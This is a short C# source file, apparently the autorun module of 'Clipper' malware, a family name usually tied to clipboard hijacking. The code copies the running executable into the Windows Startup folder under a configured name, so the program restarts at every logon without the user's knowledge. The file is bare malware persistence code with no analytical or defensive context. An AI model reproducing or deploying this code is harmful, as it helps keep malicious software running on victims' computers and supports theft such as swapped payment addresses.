﻿using System;
using System.IO;
using System.Reflection;

namespace Clipper.Modules
{
	internal sealed class Autorun
	{
		public static bool is_installed()
		{
			return File.Exists(Autorun.startup_directory + "\\" + config.autorun_name + ".exe");
		}

		public static void install()
		{
			if (config.autorun_enabled)
			{
				File.Copy(Autorun.executable, Autorun.startup_directory + "\\" + config.autorun_name + ".exe");
			}
		}

		private static string startup_directory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

		private static string executable = Assembly.GetEntryAssembly().Location;
	}
}
